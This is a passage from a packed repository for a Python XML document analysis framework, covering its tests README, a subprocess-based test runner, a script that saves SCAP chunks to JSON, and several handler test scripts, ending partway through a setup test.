│   ├── test_hibernate_handler.py
│   ├── test_ivy_handler.py
│   ├── test_log4j_handler.py
│   ├── test_svg_handler.py
│   ├── test_docbook_handler.py
│   ├── test_sitemap_handler.py
│   ├── test_kml_handler.py
│   ├── test_gpx_handler.py
│   ├── test_xhtml_handler.py
│   ├── test_wadl_handler.py
│   ├── test_struts_handler.py
│   ├── test_graphml_handler.py
│   └── test_xliff_handler.py
│
├── integration/               # Handler integration tests
│   ├── __init__.py
│   ├── test_ant_integration.py
│   ├── test_svg_integration.py
│   ├── test_docbook_integration.py
│   ├── test_sitemap_integration.py
│   ├── test_kml_integration.py
│   ├── test_gpx_integration.py
│   ├── test_xhtml_integration.py
│   ├── test_wadl_integration.py
│   ├── test_struts_integration.py
│   ├── test_graphml_integration.py
│   └── test_xliff_integration.py
│
└── comprehensive/             # Full system tests
    ├── __init__.py
    ├── test_all_sample_data.py    # Test all handlers against all sample data
    ├── test_gpx_comprehensive.py  # Detailed GPX analysis
    ├── test_xhtml_comprehensive.py # Detailed XHTML analysis
    └── test_kml_manual.py         # Manual KML testing
```

## Test Categories

### Unit Tests (`unit/`)
Individual handler tests that verify each handler's functionality in isolation:
- Handler import and initialization
- Document type detection (`can_handle()` method)
- Document analysis (`analyze()` method)
- Key data extraction (`extract_key_data()` method)
- Synthetic test files for controlled testing

### Integration Tests (`integration/`)
Tests that verify handlers work correctly within the main framework:
- Handler registration and discovery
- End-to-end document analysis through `XMLDocumentAnalyzer`
- Confidence scoring and handler selection
- Integration with the centralized handler registry

### Framework Tests
Core framework functionality tests:
- `test_framework.py`: Basic framework operations
- `test_setup.py`: Environment and setup validation
- `test_existing_handlers.py`: Legacy handler compatibility
- `test_migration_progress.py`: Migration status tracking

### Comprehensive Tests (`comprehensive/`)
Full system validation and performance testing:
- `test_all_sample_data.py`: Tests all 28 handlers against 99 sample files
- `test_*_comprehensive.py`: Detailed analysis of specific handler types
- Performance benchmarking and quality metrics

## Running Tests

### 🚀 Main Production Tests
```bash
# Run comprehensive end-to-end test (100% success rate)
cd tests/manual
python test_end_to_end_workflow.py

# Run chunking validation test
cd tests/manual  
python test_all_chunking.py
```

### 🧪 Standard Test Suite
```bash
# Run all framework tests
cd tests
python run_all_tests.py
```

### 🔍 Specific Test Categories
```bash
# Unit tests only
cd unit && python test_ant_handler.py

# Integration tests only  
cd integration && python test_ant_integration.py

# Comprehensive tests only
cd comprehensive && python test_all_sample_data.py

# Debug and troubleshooting
cd debug && python debug_analyzer_issue.py
```

### Run Individual Tests
```bash
# From tests directory
python unit/test_xliff_handler.py
python integration/test_xliff_integration.py
python comprehensive/test_all_sample_data.py
```

## Test Results Interpretation

### Success Criteria
- **Unit Tests**: Handler correctly processes synthetic test files
- **Integration Tests**: Handler integrates properly with main framework
- **Comprehensive Tests**: High success rate across all sample data

### Performance Metrics
- **Processing Speed**: Average time per file (target: <0.1s)
- **Success Rate**: Percentage of files processed without errors (target: >95%)
- **Quality Scores**: Handler-specific quality assessment (target: >0.7)

## Adding New Tests

### For New Handlers
1. Create unit test in `unit/test_[handler_name]_handler.py`
2. Create integration test in `integration/test_[handler_name]_integration.py`
3. Add synthetic test files in `../sample_data/test_files_synthetic/small/[type]/`
4. Update handler registry in `../src/handlers/__init__.py`

### Test File Template
```python
#!/usr/bin/env python3
"""
Test [Handler Name] handler implementation
"""
import sys
import os
from pathlib import Path

# Add the src directory to the path
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'src'))

def test_handler():
    """Test [Handler Name] handler with sample files"""
    
    try:
        from handlers.[handler_file] import [HandlerClass]
        print("✅ [HandlerClass] imported successfully")
    except ImportError as e:
        print(f"❌ Failed to import [HandlerClass]: {e}")
        return False
    
    # Add test implementation
    return True

if __name__ == "__main__":
    success = test_handler()
    sys.exit(0 if success else 1)
```

## Current Status

- **✅ 29 Specialized Handlers** implemented and tested
- **✅ 100% Success Rate** across all 71 test files (latest comprehensive test)
- **✅ 2,752 Chunks Generated** with optimal 38.8 average per file
- **✅ 54 Document Types** detected with 90-100% confidence
- **✅ Sub-millisecond** average processing time per document
- **✅ Production Ready** with comprehensive enterprise, security, and AI integration

The test suite validates that the XML analysis framework achieves enterprise-grade reliability and performance with full AI workflow integration.
</file>

<file path="tests/run_all_tests.py">
#!/usr/bin/env python3
"""
Comprehensive test runner for all XML handler tests

Runs tests from the organized test directory structure:
- tests/unit/: Individual handler unit tests
- tests/integration/: Handler integration tests
- tests/comprehensive/: Full system tests
- tests/: Framework tests
"""

import sys
import os
import subprocess
import time
from pathlib import Path
from typing import List, Dict, Tuple

def run_python_script(script_path: Path) -> Tuple[bool, str, float]:
    """Run a Python script and return success status, output, and execution time"""
    start_time = time.time()
    
    try:
        result = subprocess.run(
            [sys.executable, str(script_path)],
            capture_output=True,
            text=True,
            timeout=60,  # 60 second timeout
            cwd=script_path.parent
        )
        
        execution_time = time.time() - start_time
        success = result.returncode == 0
        output = result.stdout + result.stderr
        
        return success, output, execution_time
        
    except subprocess.TimeoutExpired:
        execution_time = time.time() - start_time
        return False, "Test timed out after 60 seconds", execution_time
    except Exception as e:
        execution_time = time.time() - start_time
        return False, f"Error running test: {e}", execution_time

def find_test_files(test_dir: Path) -> List[Path]:
    """Find all test_*.py files in a directory"""
    if not test_dir.exists():
        return []
    return sorted(test_dir.glob("test_*.py"))

def run_test_category(category_name: str, test_files: List[Path]) -> Dict:
    """Run all tests in a category and return results"""
    print(f"\n🧪 Running {category_name} Tests")
    print("=" * 60)
    
    results = {
        'category': category_name,
        'total': len(test_files),
        'passed': 0,
        'failed': 0,
        'skipped': 0,
        'total_time': 0.0,
        'test_results': []
    }
    
    if not test_files:
        print(f"  ⏭️  No test files found in {category_name}")
        return results
    
    for test_file in test_files:
        print(f"\n🔍 Running {test_file.name}")
        
        success, output, exec_time = run_python_script(test_file)
        results['total_time'] += exec_time
        
        test_result = {
            'name': test_file.name,
            'success': success,
            'execution_time': exec_time,
            'output': output
        }
        results['test_results'].append(test_result)
        
        if success:
            print(f"  ✅ PASSED ({exec_time:.2f}s)")
            results['passed'] += 1
        else:
            print(f"  ❌ FAILED ({exec_time:.2f}s)")
            results['failed'] += 1
            # Print first few lines of error for debugging
            error_lines = output.split('\n')[:5]
            for line in error_lines:
                if line.strip():
                    print(f"     {line}")
    
    # Category summary
    success_rate = (results['passed'] / results['total']) * 100 if results['total'] > 0 else 0
    print(f"\n📊 {category_name} Summary: {results['passed']}/{results['total']} tests passed ({success_rate:.1f}%)")
    print(f"   ⏱️  Total time: {results['total_time']:.2f}s")
    
    return results

def main():
    """Run all tests in organized structure"""
    print("🧪 XML HANDLERS COMPREHENSIVE TEST SUITE")
    print("=" * 80)
    print("Testing all handlers from organized test directory structure")
    
    # Change to the project root directory
    script_dir = Path(__file__).parent
    project_root = script_dir.parent
    os.chdir(project_root)
    
    # Test categories
    test_categories = [
        ("Unit Tests", find_test_files(script_dir / "unit")),
        ("Integration Tests", find_test_files(script_dir / "integration")),
        ("Framework Tests", find_test_files(script_dir)),
        ("Comprehensive Tests", find_test_files(script_dir / "comprehensive"))
    ]
    
    # Run all test categories
    all_results = []
    total_start_time = time.time()
    
    for category_name, test_files in test_categories:
        if test_files or category_name == "Framework Tests":  # Always run framework tests
            category_results = run_test_category(category_name, test_files)
            all_results.append(category_results)
    
    total_execution_time = time.time() - total_start_time
    
    # Overall summary
    print("\n" + "=" * 80)
    print("📊 OVERALL TEST RESULTS SUMMARY")
    print("=" * 80)
    
    grand_total = sum(r['total'] for r in all_results)
    grand_passed = sum(r['passed'] for r in all_results)
    grand_failed = sum(r['failed'] for r in all_results)
    overall_success_rate = (grand_passed / grand_total) * 100 if grand_total > 0 else 0
    
    print(f"Total Tests Run: {grand_total}")
    print(f"Passed: {grand_passed}")
    print(f"Failed: {grand_failed}")
    print(f"Overall Success Rate: {overall_success_rate:.1f}%")
    print(f"Total Execution Time: {total_execution_time:.2f}s")
    
    # Category breakdown
    print(f"\n📋 Results by Category:")
    for result in all_results:
        category_rate = (result['passed'] / result['total']) * 100 if result['total'] > 0 else 0
        print(f"  {result['category']:20} {result['passed']:3}/{result['total']:3} ({category_rate:5.1f}%) - {result['total_time']:5.2f}s")
    
    # Failed tests detail
    failed_tests = []
    for result in all_results:
        for test_result in result['test_results']:
            if not test_result['success']:
                failed_tests.append((result['category'], test_result['name'], test_result['output']))
    
    if failed_tests:
        print(f"\n❌ Failed Tests Details:")
        for category, test_name, output in failed_tests:
            print(f"  {category}/{test_name}")
            # Show first error line
            error_lines = [line for line in output.split('\n') if line.strip() and ('❌' in line or 'Error' in line)]
            if error_lines:
                print(f"    → {error_lines[0]}")
    
    # Performance analysis
    print(f"\n⚡ Performance Summary:")
    avg_time = total_execution_time / grand_total if grand_total > 0 else 0
    print(f"  Average test time: {avg_time:.3f}s")
    
    # Find slowest tests
    all_test_times = []
    for result in all_results:
        for test_result in result['test_results']:
            all_test_times.append((test_result['execution_time'], f"{result['category']}/{test_result['name']}"))
    
    if all_test_times:
        slowest_tests = sorted(all_test_times, reverse=True)[:5]
        print(f"  Slowest tests:")
        for exec_time, test_name in slowest_tests:
            print(f"    {test_name}: {exec_time:.3f}s")
    
    print("\n" + "=" * 80)
    
    # Exit with appropriate code
    if overall_success_rate >= 80:
        print("🎉 TEST SUITE PASSED! Excellent success rate.")
        sys.exit(0)
    elif overall_success_rate >= 60:
        print("⚠️  TEST SUITE PARTIAL SUCCESS. Some tests need attention.")
        sys.exit(1)
    else:
        print("❌ TEST SUITE FAILED. Many tests need fixing.")
        sys.exit(1)

if __name__ == "__main__":
    main()
</file>

<file path="tests/save_scap_chunks.py">
#!/usr/bin/env python3
"""
Save SCAP document chunks with full content for examination
"""

import sys
import os
import json
import xml.etree.ElementTree as ET
from datetime import datetime

# Add src to path  
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

from core.chunking import ChunkingOrchestrator, ChunkingConfig
from handlers.scap_handler import SCAPHandler

def save_scap_chunks():
    """Save SCAP document chunks with full content"""
    
    # SCAP file to process
    scap_file = "sample_data/test_files/small/scap/ios-sample-1.1.xccdf.xml"
    
    print("💾 SAVING SCAP CHUNKS WITH FULL CONTENT")
    print("=" * 60)
    print(f"File: {scap_file}")
    print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    if not os.path.exists(scap_file):
        print(f"❌ File not found: {scap_file}")
        return
    
    # Analyze with SCAP handler
    handler = SCAPHandler()
    tree = ET.parse(scap_file)
    root = tree.getroot()
    namespaces = {prefix: uri for prefix, uri in root.nsmap.items()} if hasattr(root, 'nsmap') else {}
    
    can_handle, confidence = handler.can_handle(root, namespaces)
    if can_handle:
        analysis_result = handler.analyze(root, scap_file)
        analysis_dict = {
            'document_type': {'type_name': analysis_result.document_type},
            'key_findings': analysis_result.key_findings,
            'structured_data': analysis_result.structured_data
        }
        print(f"✅ SCAP Handler Analysis: {analysis_result.document_type}")
    else:
        print("❌ SCAP Handler failed - using generic analysis")
        return
    
    # Create orchestrator and config
    orchestrator = ChunkingOrchestrator()
    config = ChunkingConfig(
        max_chunk_size=1500,
        min_chunk_size=200,
        overlap_size=100,
        preserve_hierarchy=True
    )
    
    # Test all strategies and save chunks
    strategies = ['hierarchical', 'sliding_window', 'content_aware', 'auto']
    
    for strategy in strategies:
        print(f"\n📋 Processing {strategy.upper()} strategy...")
        
        try:
            chunks = orchestrator.chunk_document(
                scap_file,
                analysis_dict,
                strategy=strategy,
                config=config
            )
            
            print(f"   Generated {len(chunks)} chunks")
            
            if chunks:
                # Save chunks to file
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                output_file = f"scap_chunks_{strategy}_{timestamp}.json"
                
                # Convert chunks to serializable format
                chunks_data = {
                    "metadata": {
                        "file_analyzed": scap_file,
                        "strategy": strategy,
                        "chunk_count": len(chunks),
                        "analysis_timestamp": datetime.now().isoformat(),
                        "document_type": analysis_dict['document_type']['type_name']
                    },
                    "chunks": []
                }
                
                for i, chunk in enumerate(chunks):
                    chunk_data = {
                        "chunk_number": i + 1,
                        "chunk_id": chunk.chunk_id,
                        "element_path": chunk.element_path,
                        "token_estimate": chunk.token_estimate,
                        "content_length": len(chunk.content),
                        "elements_included": chunk.elements_included,
                        "metadata": chunk.metadata,
                        "start_line": chunk.start_line,
                        "end_line": chunk.end_line,
                        "parent_context": chunk.parent_context,
                        "full_content": chunk.content  # The actual chunk content
                    }
                    chunks_data["chunks"].append(chunk_data)
                
                # Save to file
                with open(output_file, 'w', encoding='utf-8') as f:
                    json.dump(chunks_data, f, indent=2, ensure_ascii=False)
                
                file_size = os.path.getsize(output_file)
                print(f"   💾 Saved to: {output_file}")
                print(f"   📊 File size: {file_size:,} bytes")
                
                # Show first chunk preview
                if len(chunks) > 0:
                    first_chunk = chunks[0]
                    content_preview = first_chunk.content[:200] + "..." if len(first_chunk.content) > 200 else first_chunk.content
                    content_preview = content_preview.replace('\n', ' ').replace('\t', ' ')
                    print(f"   📄 First chunk preview: {content_preview}")
                
        except Exception as e:
            print(f"❌ Error with {strategy}: {e}")
            import traceback
            traceback.print_exc()
    
    print(f"\n✅ SCAP chunk files saved!")
    print(f"📁 Look for files matching pattern: scap_chunks_*_{datetime.now().strftime('%Y%m%d')}_*.json")
    
    # Show file listing
    import glob
    chunk_files = glob.glob("scap_chunks_*.json")
    if chunk_files:
        print(f"\n📁 Available SCAP chunk files:")
        for file in sorted(chunk_files):
            size = os.path.getsize(file)
            print(f"   {file} ({size:,} bytes)")

if __name__ == "__main__":
    save_scap_chunks()
</file>

<file path="tests/test_existing_handlers.py">
#!/usr/bin/env python3
"""
Test Existing XML Handlers

This script tests all existing XML handlers with the available sample data
to ensure they work correctly before we begin migration.
"""

import sys
import json
from pathlib import Path
from typing import Dict, List, Any, Optional
import traceback

# Add src directory to path
sys.path.insert(0, str(Path(__file__).parent / "src"))

try:
    from core.analyzer import XMLDocumentAnalyzer
    from xml_schema_analyzer_fixed import XMLSchemaAnalyzer
except ImportError as e:
    print(f"❌ Failed to import required modules: {e}")
    sys.exit(1)

class HandlerTester:
    """Test framework for XML handlers"""
    
    def __init__(self):
        self.analyzer = XMLDocumentAnalyzer()
        self.schema_analyzer = XMLSchemaAnalyzer()
        self.test_results = {
            'total_files': 0,
            'successful_analyses': 0,
            'failed_analyses': 0,
            'handler_coverage': {},
            'detailed_results': []
        }
    
    def run_comprehensive_tests(self):
        """Run tests on all available sample files"""
        print("🧪 Starting Comprehensive Handler Testing")
        print("=" * 60)
        
        # Test files that should match existing handlers
        test_cases = [
            # SCAP Handler tests
            ("SCAP Handler", [
                "../sample_data/stigs_old/node2.example.com-STIG-20250710162433.xml",
                "../sample_data/test_files/small/scap/ios-sample-1.0.xccdf.xml",
                "../sample_data/test_files/small/scap/ios-sample-1.1.xccdf.xml",
                "../sample_data/test_files_synthetic/small/scap/security-assessment-report.xml"
            ]),
            
            # RSS Handler tests
            ("RSS Handler", [
                "../sample_data/test_files_synthetic/small/rss/sample-feed.xml"
            ]),
            
            # Maven POM Handler tests
            ("Maven POM Handler", [
                "../sample_data/test_files_synthetic/small/pom/spring-boot-example-pom.xml"
            ]),
            
            # Spring Config Handler tests
            ("Spring Config Handler", [
                "../sample_data/test_files_synthetic/small/spring/applicationContext-example.xml"
            ]),
            
            # Log4j Config Handler tests
            ("Log4j Config Handler", [
                "../sample_data/test_files_synthetic/small/log4j/log4j2-example.xml"
            ]),
            
            # SVG Handler tests
            ("SVG Handler", [
                "../sample_data/test_files_synthetic/small/svg/sample-icon.svg"
            ]),
            
            # DocBook Handler tests
            ("DocBook Handler", [
                "../sample_data/test_files_synthetic/small/docbook/sample-docbook-guide.xml"
            ]),
            
            # Sitemap Handler tests
            ("Sitemap Handler", [
                "../sample_data/test_files_synthetic/small/sitemap/sitemap-example.xml"
            ]),
            
            # WSDL Handler tests (from src/handlers)
            ("WSDL Handler", [
                "../sample_data/test_files/small/wsdl/calculator-soap.wsdl",
                "../sample_data/test_files/small/wsdl/bet365-contacts-soap.wsdl",
                "../sample_data/test_files_synthetic/small/wsdl/hotel-reservation-service.wsdl"
            ]),
            
            # XSD Handler tests (from src/handlers)
            ("XSD Handler", [
                "../sample_data/test_files/small/scap/xccdf_1.2_bundle_2_xml.xsd",
                "../sample_data/test_files_synthetic/small/xsd/library-schema.xsd"
            ])
        ]
        
        # Run tests for each handler
        for handler_name, file_paths in test_cases:
            print(f"\n🔍 Testing {handler_name}")
            print("-" * 40)
            
            handler_results = {
                'handler': handler_name,
                'files_tested': 0,
                'files_passed': 0,
                'files_failed': 0,
                'details': []
            }
            
            for file_path in file_paths:
                result = self.test_single_file(file_path, handler_name)
                handler_results['files_tested'] += 1
                handler_results['details'].append(result)
                
                if result['success']:
                    handler_results['files_passed'] += 1
                    print(f"  ✅ {Path(file_path).name} - {result['detected_type']}")
                else:
                    handler_results['files_failed'] += 1
                    print(f"  ❌ {Path(file_path).name} - {result['error']}")
            
            self.test_results['handler_coverage'][handler_name] = handler_results
            
            # Summary for this handler
            success_rate = (handler_results['files_passed'] / handler_results['files_tested']) * 100 if handler_results['files_tested'] > 0 else 0
            print(f"  📊 Success Rate: {success_rate:.1f}% ({handler_results['files_passed']}/{handler_results['files_tested']})")
        
        # Test some additional files to see generic handler behavior
        print(f"\n🔍 Testing Additional Files (Generic Behavior)")
        print("-" * 40)
        additional_files = [
            "../sample_data/test_files/small/ant/build.xml",  # Should be generic (no ant handler yet)
            "../sample_data/test_files/small/kml/mapbox-example.kml",  # Should be generic
            "../sample_data/test_files/small/nuget/example-nuspec.xml"  # Should be generic
        ]
        
        for file_path in additional_files:
            result = self.test_single_file(file_path, "Generic")
            if result['success']:
                print(f"  ✅ {Path(file_path).name} - {result['detected_type']}")
            else:
                print(f"  ❌ {Path(file_path).name} - {result['error']}")
        
        self.print_final_summary()
        return self.test_results
    
    def test_single_file(self, file_path: str, expected_handler: str = None) -> Dict[str, Any]:
        """Test analysis of a single XML file"""
        result = {
            'file_path': file_path,
            'expected_handler': expected_handler,
            'success': False,
            'detected_type': None,
            'handler_used': None,
            'analysis_time': 0.0,
            'error': None,
            'findings_count': 0
        }
        
        try:
            # Check if file exists
            if not Path(file_path).exists():
                result['error'] = "File not found"
                return result
            
            # Time the analysis
            import time
            start_time = time.time()
            
            # Run the analysis
            analysis_result = self.analyzer.analyze_document(file_path)
            
            end_time = time.time()
            result['analysis_time'] = end_time - start_time
            
            # Check if analysis was successful (no error key means success)
            if 'error' not in analysis_result:
                result['success'] = True
                doc_type = analysis_result.get('document_type')
                result['detected_type'] = doc_type.type_name if doc_type else 'Unknown'
                result['handler_used'] = analysis_result.get('handler_used', 'Unknown')
                
                # Count findings
                analysis = analysis_result.get('analysis')
                if analysis and hasattr(analysis, 'key_findings'):
                    findings = analysis.key_findings
                    result['findings_count'] = len(findings) if isinstance(findings, dict) else 0
                else:
                    result['findings_count'] = 0
                
            else:
                result['error'] = analysis_result.get('error', 'Unknown analysis error')
                
        except Exception as e:
            result['error'] = f"Exception: {str(e)}"
            traceback.print_exc()
        
        self.test_results['total_files'] += 1
        if result['success']:
            self.test_results['successful_analyses'] += 1
        else:
            self.test_results['failed_analyses'] += 1
        
        self.test_results['detailed_results'].append(result)
        return result
    
    def print_final_summary(self):
        """Print comprehensive test summary"""
        print("\n" + "=" * 60)
        print("📋 FINAL TEST SUMMARY")
        print("=" * 60)
        
        total = self.test_results['total_files']
        success = self.test_results['successful_analyses']
        failed = self.test_results['failed_analyses']
        
        success_rate = (success / total) * 100 if total > 0 else 0
        
        print(f"Total Files Tested: {total}")
        print(f"Successful Analyses: {success}")
        print(f"Failed Analyses: {failed}")
        print(f"Overall Success Rate: {success_rate:.1f}%")
        
        print(f"\n📊 Handler Performance:")
        for handler_name, results in self.test_results['handler_coverage'].items():
            files_tested = results['files_tested']
            files_passed = results['files_passed']
            rate = (files_passed / files_tested) * 100 if files_tested > 0 else 0
            print(f"  {handler_name}: {rate:.1f}% ({files_passed}/{files_tested})")
        
        # Identify any critical failures
        critical_failures = []
        for handler_name, results in self.test_results['handler_coverage'].items():
            if results['files_failed'] > 0:
                critical_failures.append(f"{handler_name}: {results['files_failed']} failures")
        
        if critical_failures:
            print(f"\n⚠️  Critical Issues Found:")
            for failure in critical_failures:
                print(f"  - {failure}")
            print("\n❌ RECOMMENDATION: Fix these issues before proceeding with migration")
            return False
        else:
            print(f"\n✅ All handlers working correctly!")
            print("✅ RECOMMENDATION: Safe to proceed with migration")
            return True
    
    def save_results(self, output_file: str = "handler_test_results.json"):
        """Save detailed test results to JSON file"""
        with open(output_file, 'w') as f:
            json.dump(self.test_results, f, indent=2)
        print(f"\n💾 Detailed results saved to: {output_file}")

def main():
    """Main test execution"""
    print("🚀 XML Handler Testing Suite")
    print("Testing existing handlers before migration...")
    print()
    
    tester = HandlerTester()
    results = tester.run_comprehensive_tests()
    
    # Save results
    tester.save_results()
    
    # Determine if migration should proceed
    overall_success_rate = (results['successful_analyses'] / results['total_files']) * 100 if results['total_files'] > 0 else 0
    
    if overall_success_rate >= 80:  # 80% threshold for proceeding
        print(f"\n🎉 Handler testing PASSED! (Success rate: {overall_success_rate:.1f}%)")
        print("✅ Safe to proceed with handler migration.")
        return True
    else:
        print(f"\n❌ Handler testing FAILED! (Success rate: {overall_success_rate:.1f}%)")
        print("🛑 Fix issues before proceeding with migration.")
        return False

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
</file>

<file path="tests/test_framework.py">
#!/usr/bin/env python3
"""
Test script to verify the XML analysis framework is working correctly
"""

import sys
from pathlib import Path

# Add src directory to path
sys.path.insert(0, str(Path(__file__).parent / "src"))

def test_imports():
    """Test that all modules can be imported"""
    print("Testing imports...")
    
    try:
        from xml_schema_analyzer_fixed import XMLSchemaAnalyzer
        print("✅ xml_schema_analyzer_fixed imported successfully")
    except ImportError as e:
        print(f"❌ Failed to import xml_schema_analyzer_fixed: {e}")
        return False
    
    try:
        from core.analyzer import XMLDocumentAnalyzer
        print("✅ xml_specialized_handlers imported successfully")
    except ImportError as e:
        print(f"❌ Failed to import xml_specialized_handlers: {e}")
        return False
    
    try:
        from xml_chunking_strategy import ChunkingOrchestrator
        print("✅ xml_chunking_strategy imported successfully")
    except ImportError as e:
        print(f"❌ Failed to import xml_chunking_strategy: {e}")
        return False
    
    try:
        from additional_xml_handlers import MavenPOMHandler, Log4jConfigHandler
        print("✅ additional_xml_handlers imported successfully")
    except ImportError as e:
        print(f"❌ Failed to import additional_xml_handlers: {e}")
        return False
    
    return True

def test_basic_functionality():
    """Test basic functionality"""
    print("\nTesting basic functionality...")
    
    # Create a test XML
    test_xml = """<?xml version="1.0" encoding="UTF-8"?>
<test>
    <element attr="value">Content</element>
</test>"""
    
    test_path = Path("test_temp.xml")
    test_path.write_text(test_xml)
    
    try:
        from core.analyzer import XMLDocumentAnalyzer
        
        analyzer = XMLDocumentAnalyzer()
        result = analyzer.analyze_document(str(test_path))
        
        if "error" not in result:
            print("✅ Basic analysis completed successfully")
            print(f"   Document type: {result['document_type'].type_name}")
            print(f"   Handler: {result['handler_used']}")
            return True
        else:
            print(f"❌ Analysis failed: {result['error']}")
            return False
            
    except Exception as e:
        print(f"❌ Error during testing: {e}")
        return False
    finally:
        # Clean up
        if test_path.exists():
            test_path.unlink()

def test_handler_detection():
    """Test that handlers detect correct document types"""
    print("\nTesting handler detection...")
    
    test_cases = [
        {
            "name": "Maven POM",
            "xml": """<?xml version="1.0"?>
<project xmlns="http://maven.apache.org/POM/4.0.0">
    <groupId>test</groupId>
    <artifactId>test</artifactId>
</project>""",
            "expected": "Maven POM"
        },
        {
            "name": "RSS Feed",
            "xml": """<?xml version="1.0"?>
<rss version="2.0">
    <channel><title>Test</title></channel>
</rss>""",
            "expected": "RSS Feed"
        }
    ]
    
    from core.analyzer import XMLDocumentAnalyzer
    analyzer = XMLDocumentAnalyzer()
    
    all_passed = True
    
    for test_case in test_cases:
        test_path = Path("test_handler.xml")
        test_path.write_text(test_case["xml"])
        
        try:
            result = analyzer.analyze_document(str(test_path))
            detected = result['document_type'].type_name
            
            if test_case["expected"] in detected:
                print(f"✅ {test_case['name']}: Correctly detected as {detected}")
            else:
                print(f"❌ {test_case['name']}: Expected {test_case['expected']}, got {detected}")
                all_passed = False
                
        except Exception as e:
            print(f"❌ {test_case['name']}: Error - {e}")
            all_passed = False
        finally:
            if test_path.exists():
                test_path.unlink()
    
    return all_passed

def main():
    """Run all tests"""
    print("🧪 XML Analysis Framework Test Suite")
    print("="*40)
    
    tests_passed = 0
    tests_total = 3
    
    # Test 1: Imports
    if test_imports():
        tests_passed += 1
    
    # Test 2: Basic functionality
    if test_basic_functionality():
        tests_passed += 1
    
    # Test 3: Handler detection
    if test_handler_detection():
        tests_passed += 1
    
    print("\n" + "="*40)
    print(f"Tests passed: {tests_passed}/{tests_total}")
    
    if tests_passed == tests_total:
        print("✅ All tests passed! The framework is working correctly.")
        return 0
    else:
        print("❌ Some tests failed. Please check the errors above.")
        return 1

if __name__ == "__main__":
    sys.exit(main())
</file>

<file path="tests/test_migration_progress.py">
#!/usr/bin/env python3
"""
Test Migration Progress

Test if the individual handler files work correctly.
"""

import sys
from pathlib import Path

# Add src directory to path
sys.path.insert(0, str(Path(__file__).parent / "src"))

def test_individual_handlers():
    """Test if we can import individual handlers"""
    print("🧪 Testing Individual Handler Imports")
    print("-" * 40)
    
    handlers_to_test = [
        ('SCAPHandler', 'handlers.scap_handler'),
        ('RSSHandler', 'handlers.rss_handler'),
        ('MavenPOMHandler', 'handlers.maven_pom_handler'),
        ('SpringConfigHandler', 'handlers.spring_config_handler'),
        ('GenericXMLHandler', 'handlers.generic_xml_handler'),
    ]
    
    success_count = 0
    
    for handler_name, module_path in handlers_to_test:
        try:
            module = __import__(module_path, fromlist=[handler_name])
            handler_class = getattr(module, handler_name)
            
            # Test instantiation
            handler_instance = handler_class()
            print(f"  ✅ {handler_name} - Import and instantiation successful")
            success_count += 1
            
        except Exception as e:
            print(f"  ❌ {handler_name} - Failed: {e}")
    
    print(f"\n📊 Results: {success_count}/{len(handlers_to_test)} handlers working")
    return success_count == len(handlers_to_test)

def test_registry_import():
    """Test if we can import from the registry"""
    print("\n🧪 Testing Handler Registry Import")
    print("-" * 40)
    
    try:
        from handlers import ALL_HANDLERS, HANDLER_CATEGORIES
        print(f"  ✅ Registry imported successfully")
        print(f"  📊 {len(ALL_HANDLERS)} handlers in registry")
        print(f"  📂 {len(HANDLER_CATEGORIES)} categories defined")
        
        # Test instantiation of a few handlers from registry
        test_handlers = ALL_HANDLERS[:3]  # Test first 3
        for handler_class in test_handlers:
            try:
                instance = handler_class()
                print(f"    ✅ {handler_class.__name__} instantiated from registry")
            except Exception as e:
                print(f"    ❌ {handler_class.__name__} failed: {e}")
                return False
        
        return True
        
    except Exception as e:
        print(f"  ❌ Registry import failed: {e}")
        return False

def test_sample_analysis():
    """Test analysis with a sample file using migrated handlers"""
    print("\n🧪 Testing Sample Analysis with Migrated Handlers")
    print("-" * 40)
    
    try:
        # Import a specific handler directly
        from handlers.rss_handler import RSSHandler
        
        # Test with RSS file
        rss_file = "../sample_data/test_files_synthetic/small/rss/sample-feed.xml"
        if not Path(rss_file).exists():
            print("  ⏭️  RSS sample file not found, skipping")
            return True
        
        # Parse the file
        import xml.etree.ElementTree as ET
        tree = ET.parse(rss_file)
        root = tree.getroot()
        
        # Extract namespaces
        namespaces = {child[0]: child[1] for _, child in ET.iterparse(rss_file, events=['start-ns'])}
        
        # Test handler
        handler = RSSHandler()
        can_handle, confidence = handler.can_handle(root, namespaces)
        
        if can_handle:
            doc_type = handler.detect_type(root, namespaces)
            analysis = handler.analyze(root, rss_file)
            
            print(f"  ✅ RSS Handler Analysis Successful")
            print(f"    📄 Document Type: {doc_type.type_name}")
            print(f"    🎯 Confidence: {confidence}")
            print(f"    📊 Findings: {len(analysis.key_findings) if analysis.key_findings else 0}")
            return True
        else:
            print(f"  ❌ RSS Handler cannot handle the file")
            return False
            
    except Exception as e:
        print(f"  ❌ Sample analysis failed: {e}")
        import traceback
        traceback.print_exc()
        return False

def main():
    """Main test execution"""
    print("🚀 Testing Handler Migration Progress")
    print("=" * 50)
    
    all_tests_passed = True
    
    # Test 1: Individual handler imports
    if not test_individual_handlers():
        all_tests_passed = False
    
    # Test 2: Registry import
    if not test_registry_import():
        all_tests_passed = False
    
    # Test 3: Sample analysis
    if not test_sample_analysis():
        all_tests_passed = False
    
    # Summary
    print("\n" + "=" * 50)
    if all_tests_passed:
        print("🎉 All migration tests PASSED!")
        print("✅ Handler migration is working correctly")
    else:
        print("❌ Some migration tests FAILED!")
        print("🛑 Need to fix issues before proceeding")
    
    return all_tests_passed

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
</file>

<file path="tests/test_setup.py">
#!/usr/bin/env python3
"""
Quick test script to validate the XML analyzer setup
"""

import sys
from pathlib import Path

# Add src directory to path
sys.path.append(str(Path(__file__).parent / "src"))

def test_imports():
    """Test that all required imports work"""
    try:
        from xml_schema_analyzer_fixed import XMLSchemaAnalyzer, analyze_xml_file
        print("✅ Imports successful")
        return True
    except Exception as e:
        print(f"❌ Import failed: {e}")
        return False

def test_sample_file():
    """Test with a sample XML file"""
    sample_files = [
        "../sample_data/node2.example.com-STIG-20250710162433.xml",
        "../sample_data/node2.example.com-PCI-20250710162255.xml"
    ]
    
    for sample_file in sample_files:
        if Path(sample_file).exists():
            print(f"📄 Testing with {sample_file}")
            try:
                from xml_schema_analyzer_fixed import XMLSchemaAnalyzer
                analyzer = XMLSchemaAnalyzer()
                
                # Quick test - just parse first 1000 lines to validate structure
                with open(sample_file, 'r') as f:
                    first_part = ''.join(f.readlines()[:1000])
